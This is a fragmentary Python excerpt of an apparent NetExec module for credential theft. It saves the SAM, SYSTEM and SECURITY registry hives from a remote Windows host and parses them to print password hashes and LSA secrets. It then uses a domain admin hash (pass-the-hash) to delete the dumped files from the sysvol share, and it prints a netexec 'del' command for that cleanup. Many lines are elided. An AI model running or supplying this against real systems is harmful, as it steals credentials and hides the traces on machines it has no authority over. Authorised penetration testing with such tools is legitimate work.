...
class NXCModule:
    ...
    def __init__(self, context=None, module_options=None):
        ...
        self.deleted_files = (
            True  # flag to check if SAM/SYSTEM/SECURITY files were deleted
        )
    ...
    def on_login(self, context, connection):
        ...
        try:
            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                ...
                context.log.debug(
                    f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)"
                )
                try:
                    ...
                    context.log.fail(
                        f"Couldn't save {hive}: {e} on path {outputFileName}"
                    )
                    return
        ...
        log_path = os.path.expanduser(
            f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(
                ":", "-"
            )
        )
        ...
        try:
            ...
            sam_hashes = SAMHashes(
                ...
                boot_key,
                isRemote=False,
                perSecretCallback=lambda secret: parse_sam(secret),
            )
            sam_hashes.dump()
            sam_hashes.finish()
            ...
            LSA = LSASecrets(
                ...
                None,
                isRemote=False,
                perSecretCallback=lambda secret_type, secret: context.log.highlight(
                    secret
                ),
            )
        ...
        if self.domain_admin:
            ...
            if connection.hash_login(
                connection.domain, self.domain_admin, self.domain_admin_hash
            ):
                try:
                ...
                context.log.display(
                    f"Cleaning dump with user {self.domain_admin} and hash {self.domain_admin_hash} on domain {connection.domain}"
                )
                connection.execute(
                    "del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM"
                )
                for hive in ["SAM", "SECURITY", "SYSTEM"]:
                    try:
                        ...
                        if out:
                            ...
                            context.log.fail(
                                f"Fail to remove the file {hive}, path: C:\\Windows\\sysvol\\sysvol\\{hive}"
                            )
        ...
        if not self.deleted_files:
            context.log.display(
                "Use the domain admin account to clean the file on the remote host"
            )
            context.log.display(
                'netexec smb dc_ip -u user -p pass -x "del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM"'
            )  # noqa: Q003
        else:
